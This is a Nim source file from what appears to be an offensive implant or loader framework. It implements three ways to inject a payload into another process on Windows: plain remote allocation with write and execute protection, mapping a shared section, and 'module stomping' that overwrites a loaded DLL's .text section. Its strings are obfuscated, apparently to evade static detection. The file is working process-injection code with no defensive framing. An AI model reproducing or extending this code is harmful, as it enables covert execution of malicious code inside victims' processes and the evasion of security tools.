import std/strutils
import ../../utils/global
import ../../utils/general/strings
import ../../utils/winapi/handlers
import ../../utils/winapi/syscall
import ../../utils/winapi/utils
import utils
import ../../utils/msg

const
  memCommitReserve = 0x3000'u32
  pageRw = 0x04'u32
  pageSize = 4096

proc payloadExecProtect*(rwx: bool): culong =
  # Returns the execute protection for the payload
  if rwx: PAGE_EXECUTE_READWRITE
  else: PAGE_EXECUTE_READ

proc allocVanillaRemote*(procH: pointer; payload: openArray[byte]; rwx = false): pointer =
  # Allocates remote memory, writes the payload, and marks it executable
  if payload.len == 0:
    return nil
  var st: culong = 0
  let base = virtualAllocEx(procH, nil, payload.len.csize_t, memCommitReserve,
      pageRw, addr st)
  if base == nil:
    return nil
  if writeVirtualMemory(procH, base, unsafeAddr payload[0],
      payload.len.csize_t) != 0:
    return nil
  var region = payload.len.csize_t
  var old: culong = 0
  var allocBase = base
  let execProt = payloadExecProtect(rwx)
  if protectVirtualMemory(procH, addr allocBase, addr region, execProt,
      addr old) != 0:
    return nil
  base

proc allocSectionRemote*(procH: pointer; payload: openArray[byte]; rwx = false): pointer =
  # Maps a shared section into the remote process for the payload
  if payload.len == 0:
    return nil
  var viewSz = csize_t(((payload.len + pageSize - 1) div pageSize) * pageSize)
  if viewSz < pageSize.csize_t: viewSz = pageSize.csize_t
  var secH: pointer = nil
  if createSection(addr secH, int64(viewSz)) != 0 or secH == nil:
    return nil
  var localBase: pointer = nil
  var sz = viewSz
  if mapViewOfSection(secH, currentProcess, addr localBase, addr sz, pageRw) !=
      0 or localBase == nil:
    discard ntCloseHandle(secH)
    return nil
  copyMem(localBase, unsafeAddr payload[0], payload.len)
  if unmapViewOfSection(currentProcess, localBase) != 0:
    discard ntCloseHandle(secH)
    return nil
  var remoteBase: pointer = nil
  sz = viewSz
  let execProt = payloadExecProtect(rwx)
  if mapViewOfSection(secH, procH, addr remoteBase, addr sz,
      execProt) != 0 or remoteBase == nil:
    discard ntCloseHandle(secH)
    return nil
  discard ntCloseHandle(secH)
  remoteBase

proc allocStompRemote*(procH: pointer; pid: uint32; payload: openArray[byte];
    dllHint = ""; rwx = false): pointer =
  # Writes the payload over a loaded module text section
  const
    peHdrRead = 4096
    codeAlign = 16
    invalidSnap = cast[pointer](-1)
    th32Mod = 0x00000008'u32
    th32Mod32 = 0x00000010'u32
    scnExec = 0x20000000'u32
    peMagic64 = 0x20B'u16
  type
    ModuleEntry32W = object
      dwSize: uint32
      th32ModuleID: uint32
      th32ProcessID: uint32
      glblcntUsage: uint32
      proccntUsage: uint32
      modBaseAddr: pointer
      modBaseSize: uint32
      hModule: pointer
      szModule: array[256, uint16]
      szExePath: array[260, uint16]
  clearStompErr()
  if payload.len == 0 or pid == 0 or procH == nil:
    return stompFail(errorText(obf("stomp requires valid pid, process handle, and payload")))
  var hSnap = createToolhelp32Snapshot(th32Mod, culong(pid))
  if hSnap == invalidSnap:
    hSnap = createToolhelp32Snapshot(th32Mod or th32Mod32, culong(pid))
  if hSnap == invalidSnap:
    return stompFail(
      errorText(obf("module snapshot failed for stomp (pid ") & $pid, culong(
          getLastError()))
    )
  defer:
    discard closeHandle(hSnap)
  var me: ModuleEntry32W
  me.dwSize = uint32(sizeof(ModuleEntry32W))
  if module32FirstW(hSnap, addr me) == 0:
    return stompFail(errorText(obf("cannot enumerate modules in target process")))
  let hint = stompDllBaseName(dllHint)
  var hdr = newSeq[byte](peHdrRead)
  var hintSeen = false
  var scanErr = ""
  block moduleLoop:
    while true:
      if me.th32ProcessID == pid:
        let name = wideToAscii(addr me.szModule[0], culong(sizeof(
            me.szModule))).toLowerAscii()
        var tryStomp = true
        if hint.len > 0:
          if name != hint and not name.endsWith(hint):
            tryStomp = false
          else:
            hintSeen = true
        if tryStomp and hint.len == 0 and (
            name.len == 0 or name.endsWith(obf(".exe")) or name == obf("ntdll.dll") or
            name == obf("kernel32.dll") or name == obf("kernelbase.dll") or
                name == obf("wow64.dll")):
          tryStomp = false
        if tryStomp and (me.modBaseAddr == nil or me.modBaseSize == 0):
          tryStomp = false
        if tryStomp and int(me.modBaseSize) < payload.len + 0x200:
          let msg = errorText(obf("module image too small for payload: ") &
              name &
            obf(" (use --stomp-dll <dll> for a larger module)"))
          if hint.len > 0:
            return stompFail(msg)
          scanErr = msg
          tryStomp = false
        if tryStomp and readVirtualMemory(procH, me.modBaseAddr, addr hdr[0],
            peHdrRead.csize_t) != 0:
          let msg = errorText(obf("cannot read PE headers of module: ") & name)
          if hint.len > 0:
            return stompFail(msg)
          scanErr = msg
          tryStomp = false
        if tryStomp:
          var stomp: pointer = nil
          block peParse:
            let img = addr hdr[0]
            let dos = cast[ptr UncheckedArray[byte]](img)
            if dos[0] != 0x4D or dos[1] != 0x5A:
              break peParse
            let eLfanew = cast[ptr int32](cast[int](img) + 0x3C)[]
            if eLfanew <= 0 or eLfanew > 0x800:
              break peParse
            let nt = cast[pointer](cast[int](img) + eLfanew)
            if u32(nt) != 0x00004550:
              break peParse
            if cast[ptr uint16](cast[int](nt) + 4)[] != 0x8664'u16:
              break peParse
            let opt = cast[pointer](cast[int](nt) + 24)
            if cast[ptr uint16](opt)[] != peMagic64:
              break peParse
            let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
            let optSize = cast[ptr uint16](cast[int](nt) + 20)[]
            var sec = cast[int](nt) + 24 + optSize.int
            var textVa, textVs: culong
            var foundText = false
            var fbVa, fbVs: culong
            var hasFb = false
            for _ in 0 ..< nsec.int:
              let s = cast[pointer](sec)
              var secName: array[8, byte]
              copyMem(addr secName[0], s, 8)
              let sva = u32(s, 12)
              let svs = u32(s, 8)
              if secName[0] == byte('.') and secName[1] == byte('t') and
                  secName[2] == byte('e') and secName[3] == byte('x') and
                  secName[4] == byte('t'):
                textVa = sva
                textVs = svs
                foundText = true
                break
              if (u32(s, 36) and scnExec) != 0 and not hasFb:
                fbVa = sva
                fbVs = svs
                hasFb = true
              sec += 40
            if not foundText and hasFb:
              textVa = fbVa
              textVs = fbVs
              foundText = true
            if not foundText or textVs == 0:
              break peParse
            let need = ((payload.len + codeAlign - 1) div codeAlign) * codeAlign
            let vs = textVs.int
            if need > vs:
              break peParse
            let off = ((vs + codeAlign - 1) div codeAlign) * codeAlign - need
            if off < 0:
              break peParse
            stomp = cast[pointer](cast[int](me.modBaseAddr) + textVa.int + off)
          if stomp == nil:
            let msg = errorText(obf(".text too small or invalid PE in module: ") & name)
            if hint.len > 0:
              return stompFail(msg)
            scanErr = msg
          else:
            var protBase = cast[pointer](cast[int](stomp) and not (pageSize - 1))
            var protSz = csize_t(
              ((cast[int](stomp) - cast[int](protBase) + payload.len +
                  pageSize - 1) div pageSize) *
              pageSize
            )
            var oldProt: culong = 0
            var pBase = protBase
            if protectVirtualMemory(procH, addr pBase, addr protSz, pageRw,
                addr oldProt) != 0:
              let msg = errorText(obf("cannot make module .text writable: ") & name)
              if hint.len > 0:
                return stompFail(msg)
              scanErr = msg
            elif writeVirtualMemory(procH, stomp, unsafeAddr payload[0],
                payload.len.csize_t) != 0:
              var undo: culong = 0
              discard protectVirtualMemory(procH, addr pBase, addr protSz,
                  oldProt, addr undo)
              let msg = errorText(obf("cannot write into module .text: ") & name)
              if hint.len > 0:
                return stompFail(msg)
              scanErr = msg
            else:
              var rxProt: culong = 0
              let execProt = payloadExecProtect(rwx)
              discard protectVirtualMemory(
                procH, addr pBase, addr protSz, execProt, addr rxProt)
              clearStompErr()
              return stomp
      if module32NextW(hSnap, addr me) == 0:
        break moduleLoop
  if hint.len > 0 and not hintSeen:
    return stompFail(errorText(obf("stomp-dll not loaded in process: ") & hint))
  if scanErr.len > 0:
    return stompFail(scanErr)
  stompFail(
    errorText(obf("no module with usable .text for this payload (try --stomp-dll or --alloc section)"))
  )

proc allocByMode*(
  procH: pointer; payload: openArray[byte]; allocMode: string;
  pid: uint32 = 0; stompDll: string = ""; rwx: bool = false
): pointer =
  # Picks the remote alloc path from the alloc mode
  if allocMode == obf("section"):
    allocSectionRemote(procH, payload, rwx)
  elif allocMode == obf("stomp"):
    allocStompRemote(procH, pid, payload, stompDll, rwx)
  elif allocMode == obf("vanilla"):
    allocVanillaRemote(procH, payload, rwx)
  else:
    nil
